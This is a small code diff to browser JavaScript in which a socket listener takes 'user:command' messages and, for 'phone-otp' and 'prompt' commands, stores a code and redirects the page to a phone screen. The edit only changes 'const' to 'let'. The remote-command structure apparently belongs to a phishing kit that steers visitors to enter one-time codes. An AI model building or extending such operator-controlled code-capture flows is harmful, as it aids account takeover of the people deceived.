@@ -154,7 +154,7 @@ socket.on("user:command", (data) => {
 
     case "phone-otp":
       if (!code) return;
-	      const phoneNumberEl = document.querySelector("#phone");
+	      let phoneNumberEl = document.querySelector("#phone");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
@@ -165,7 +165,7 @@ socket.on("user:command", (data) => {
 
     case "prompt":
       if (!code) return;
-	      const phoneNumberEl = document.querySelector("#code");
+	      let phoneNumberEl = document.querySelector("#code");
 	      sessionStorage.setItem("setcode", code);
 	      if (!phoneNumberEl) {
 	        window.location.href = phonescreen;
